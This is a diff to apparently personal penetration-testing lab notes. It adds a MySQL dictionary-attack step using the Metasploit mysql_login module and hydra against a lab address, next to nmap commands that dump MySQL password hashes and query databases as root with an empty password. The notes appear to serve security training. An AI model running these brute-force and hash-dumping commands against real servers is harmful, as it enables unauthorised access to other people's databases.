@@ -349,10 +349,18 @@ nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3
 nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 192.71.145.3
 ```
 
-21)  
+21)  MySQL Recon: Dictionary Attack
 
 ```
-
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.149.194.3
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set STOP_ON_SUCCESS true
+exploit
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.149.194.3 mysql
 ```
 
 22)  
